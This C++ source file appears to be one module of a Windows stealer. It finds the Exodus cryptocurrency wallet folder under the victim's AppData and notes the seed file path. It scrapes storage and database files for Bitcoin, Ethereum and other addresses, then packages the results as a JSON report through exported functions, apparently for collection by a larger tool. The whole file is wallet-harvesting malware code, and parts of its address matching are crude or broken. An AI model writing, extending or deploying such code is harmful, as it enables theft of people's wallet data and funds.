#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include "../common.h"
#include "../logger/file_logger.h"

class ExodusWalletExtractor {
private:
    struct ExodusWallet {
        std::string walletPath;
        std::string seedFile;
        std::string passphrase;
        std::vector<std::string> addresses;
        std::vector<std::string> privateKeys;
        bool hasEncryptedSeed;
        std::string encryptedData;
    };
    
    std::vector<ExodusWallet> wallets;
    
public:
    ExodusWalletExtractor() {
        LogInfo("[Exodus] Initializing Exodus wallet extractor");
    }
    
    bool FindExodusWallets() {
        LogInfo("[Exodus] Searching for Exodus wallets...");
        
        WCHAR appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
            std::wstring exodusPathW = std::wstring(appDataPath) + L"\\Exodus";
            std::string exodusPath(exodusPathW.begin(), exodusPathW.end());
            
            if (PathExistsA(exodusPath.c_str())) {
                ScanExodusDirectory(exodusPath);
                LogInfo(("[Exodus] Found " + std::to_string(wallets.size()) + " Exodus wallets").c_str());
                return !wallets.empty();
            }
        }
        
        LogInfo("[Exodus] No Exodus installation found");
        return false;
    }
    
private:
    bool PathExistsA(const std::string& path) {
        DWORD attr = GetFileAttributesA(path.c_str());
        return (attr != INVALID_FILE_ATTRIBUTES);
    }
    
    void ScanExodusDirectory(const std::string& exodusPath) {
        LogInfo(("[Exodus] Scanning directory: " + exodusPath).c_str());
        
        ExodusWallet wallet;
        wallet.walletPath = exodusPath;
        
        // Look for seed phrase file
        std::string seedPath = exodusPath + "\\exodus.wallet";
        if (PathExistsA(seedPath)) {
            wallet.seedFile = seedPath;
            LogInfo("[Exodus] Found wallet file");
        }
        
        // Look for configuration files
        std::string configPath = exodusPath + "\\exodus.conf.json";
        if (PathExistsA(configPath)) {
            ParseConfigFile(configPath, wallet);
        }
        
        // Look for address files
        ScanForAddresses(exodusPath, wallet);
        
        if (!wallet.seedFile.empty() || !wallet.addresses.empty()) {
            wallets.push_back(wallet);
        }
    }
    
    void ParseConfigFile(const std::string& configPath, ExodusWallet& wallet) {
        std::ifstream file(configPath);
        if (!file.is_open()) return;
        
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Extract addresses from config
        size_t pos = 0;
        while ((pos = content.find("\"address\":", pos)) != std::string::npos) {
            size_t start = content.find("\"", pos + 10);
            size_t end = content.find("\"", start + 1);
            if (start != std::string::npos && end != std::string::npos) {
                std::string address = content.substr(start + 1, end - start - 1);
                wallet.addresses.push_back(address);
            }
            pos = end;
        }
    }
    
    void ScanForAddresses(const std::string& basePath, ExodusWallet& wallet) {
        std::vector<std::string> searchPaths = {
            basePath + "\\Local Storage",
            basePath + "\\Session Storage",
            basePath + "\\databases"
        };
        
        for (const auto& path : searchPaths) {
            if (PathExistsA(path)) {
                ScanDirectoryForFiles(path, wallet);
            }
        }
    }
    
    void ScanDirectoryForFiles(const std::string& directory, ExodusWallet& wallet) {
        WIN32_FIND_DATAA findData;
        std::string searchPath = directory + "\\*";
        
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) return;
        
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string filePath = directory + "\\" + findData.cFileName;
                AnalyzeWalletFile(filePath, wallet);
            }
        } while (FindNextFileA(hFind, &findData));
        
        FindClose(hFind);
    }
    
    void AnalyzeWalletFile(const std::string& filePath, ExodusWallet& wallet) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) return;
        
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Look for cryptocurrency addresses
        ExtractCryptoAddresses(content, wallet);
    }
    
    void ExtractCryptoAddresses(const std::string& content, ExodusWallet& wallet) {
        // Extract Bitcoin addresses
        ExtractBitcoinAddresses(content, wallet);
        
        // Extract Ethereum addresses
        ExtractEthereumAddresses(content, wallet);
        
        // Extract other crypto addresses
        ExtractOtherAddresses(content, wallet);
    }
    
    void ExtractBitcoinAddresses(const std::string& content, ExodusWallet& wallet) {
        size_t pos = 0;
        while ((pos = content.find("1", pos)) != std::string::npos || 
               (pos = content.find("3", pos)) != std::string::npos ||
               (pos = content.find("bc1", pos)) != std::string::npos) {
            
            std::string address = ExtractAddressAtPosition(content, pos);
            if (IsValidBitcoinAddress(address)) {
                wallet.addresses.push_back(address);
            }
            pos++;
        }
    }
    
    void ExtractEthereumAddresses(const std::string& content, ExodusWallet& wallet) {
        size_t pos = 0;
        while ((pos = content.find("0x", pos)) != std::string::npos) {
            if (pos + 42 <= content.length()) {
                std::string address = content.substr(pos, 42);
                if (IsValidEthereumAddress(address)) {
                    wallet.addresses.push_back(address);
                }
            }
            pos += 2;
        }
    }
    
    void ExtractOtherAddresses(const std::string& content, ExodusWallet& wallet) {
        // Extract other cryptocurrency addresses (LTC, BCH, etc.)
        std::vector<std::string> patterns = {
            "L",    // Litecoin
            "M",    // Litecoin P2SH
            "ltc1", // Litecoin Bech32
            "q",    // Bitcoin Cash
        };
        
        for (const auto& pattern : patterns) {
            size_t pos = 0;
            while ((pos = content.find(pattern, pos)) != std::string::npos) {
                std::string address = ExtractAddressAtPosition(content, pos);
                if (address.length() > 20) { // Basic validation
                    wallet.addresses.push_back(address);
                }
                pos += pattern.length();
            }
        }
    }
    
    std::string ExtractAddressAtPosition(const std::string& content, size_t pos) {
        size_t end = pos;
        while (end < content.length() && 
               (std::isalnum(content[end]) || content[end] == '_' || content[end] == '-')) {
            end++;
        }
        return content.substr(pos, end - pos);
    }
    
    bool IsValidBitcoinAddress(const std::string& address) {
        if (address.length() < 26 || address.length() > 62) {
            return false;
        }
        
        if (address[0] == '1' || address[0] == '3') {
            return address.length() >= 26 && address.length() <= 35;
        } else if (address.substr(0, 3) == "bc1") {
            return address.length() >= 42 && address.length() <= 62;
        }
        
        return false;
    }
    
    bool IsValidEthereumAddress(const std::string& address) {
        if (address.length() != 42 || address.substr(0, 2) != "0x") {
            return false;
        }
        
        for (size_t i = 2; i < address.length(); i++) {
            if (!std::isxdigit(address[i])) {
                return false;
            }
        }
        return true;
    }

public:
    std::string ExtractAll() {
        LogInfo("[Exodus] Starting Exodus wallet extraction");
        
        if (!FindExodusWallets()) {
            return "{\"exodus_wallets\":[]}";
        }
        
        return GenerateReport();
    }
    
    std::string GenerateReport() {
        std::stringstream report;
        report << "{\"exodus_wallets\":[";
        
        for (size_t i = 0; i < wallets.size(); i++) {
            if (i > 0) report << ",";
            
            report << "{";
            report << "\"path\":\"" << wallets[i].walletPath << "\",";
            report << "\"seed_file\":\"" << wallets[i].seedFile << "\",";
            report << "\"addresses\":[";
            
            for (size_t j = 0; j < wallets[i].addresses.size(); j++) {
                if (j > 0) report << ",";
                report << "\"" << wallets[i].addresses[j] << "\"";
            }
            
            report << "]}";
        }
        
        report << "]}";
        return report.str();
    }
};

// Global instance
static std::unique_ptr<ExodusWalletExtractor> g_exodusExtractor;

extern "C" {
    bool InitializeExodusExtractor() {
        try {
            g_exodusExtractor = std::make_unique<ExodusWalletExtractor>();
            LogInfo("[Exodus] Exodus extractor initialized");
            return true;
        } catch (...) {
            LogError("[Exodus] Failed to initialize Exodus extractor");
            return false;
        }
    }
    
    bool ExtractExodusData() {
        if (!g_exodusExtractor) {
            if (!InitializeExodusExtractor()) {
                return false;
            }
        }
        
        try {
            std::string data = g_exodusExtractor->ExtractAll();
            LogInfo("[Exodus] Exodus extraction completed");
            return !data.empty();
        } catch (...) {
            LogError("[Exodus] Exception during Exodus extraction");
            return false;
        }
    }
    
    const char* GetExodusReport() {
        if (!g_exodusExtractor) {
            return "{\"error\":\"Exodus extractor not initialized\"}";
        }
        
        try {
            static std::string report = g_exodusExtractor->GenerateReport();
            return report.c_str();
        } catch (...) {
            LogError("[Exodus] Failed to generate Exodus report");
            return "{\"error\":\"Failed to generate report\"}";
        }
    }
    
    void CleanupExodusExtractor() {
        if (g_exodusExtractor) {
            g_exodusExtractor.reset();
            LogInfo("[Exodus] Exodus extractor cleaned up");
        }
    }
}